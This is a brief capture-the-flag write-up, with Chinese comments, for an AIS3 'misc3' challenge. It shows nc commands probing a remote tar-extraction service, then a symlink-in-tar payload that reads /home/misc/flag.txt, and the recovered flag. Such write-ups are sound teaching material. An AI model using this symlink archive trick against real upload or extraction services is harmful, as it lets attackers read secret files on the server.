# misc3

```
inndy $ (echo -ne "1\n1\n"; sleep 5) | nc quiz.ais3.org 9150
/bin/tar: This does not look like a tar archive
/bin/tar: Exiting with failure status due to previous errors
Broken tar file.
Traceback (most recent call last):
  File "/home/misc/misc.py", line 23, in <module>
    subprocess.check_output(['/bin/tar', '-xf', tarf.name, '-C', outdir])
  File "/usr/lib/python3.4/subprocess.py", line 620, in check_output
    raise CalledProcessError(retcode, process.args, output=output)
subprocess.CalledProcessError: Command '['/bin/tar', '-xf', '/home/misc/tmp3w1067za.tar', '-C', './tmpov0oiqz8']' returned non-zero exit status 2
```

可以知道 `$HOME` 位於 `/home/misc`

技巧是 `tar` 可以保留 symbolic link

```
ln -s /home/misc/flag.txt guess.txt
tar -cf misc3.payload guess.txt
SIZE=$(wc -c < misc3.payload)
(echo $SIZE; cat misc3.payload) | nc quiz.ais3.org 9150
```

`ais3{First t1me 1$sc4pe tHE S4nd80x}`
